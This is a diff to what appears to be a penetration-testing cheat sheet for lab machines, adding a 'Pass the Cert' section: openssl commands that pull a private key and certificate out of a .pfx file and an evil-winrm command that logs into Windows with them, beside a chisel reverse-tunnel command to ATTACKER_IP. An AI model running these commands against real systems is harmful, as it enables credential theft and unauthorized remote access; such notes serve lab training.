@@ -27,3 +27,15 @@ Target Machine
 ```bash
 chisel client ATTACKER_IP:ATTACKER_PORT R:LOCAL_PORT:127.0.0.1:PORT_RUNNING_ON_TARGET_MACHINE
 ```
+
+## Windows Exploitation - Pass the Cert
+If we get a .pfx file we can get the cert.pem and key.pem from the .pfx file and try to logging in the machine if winrm service is enabled using pass the cert attack.
+Extracting the key and cert
+```
+openssl pkcs12  -in legacyy_dev_auth.pfx -info -nokeys -out cert.pem
+openssl pkcs12  -in legacyy_dev_auth.pfx -info -nocerts -nodes -out key.pem
+```
+After getting the cert and the key we can log-in
+```
+evil-winrm -i IP -S -k key.pem -c cert.pem
+```
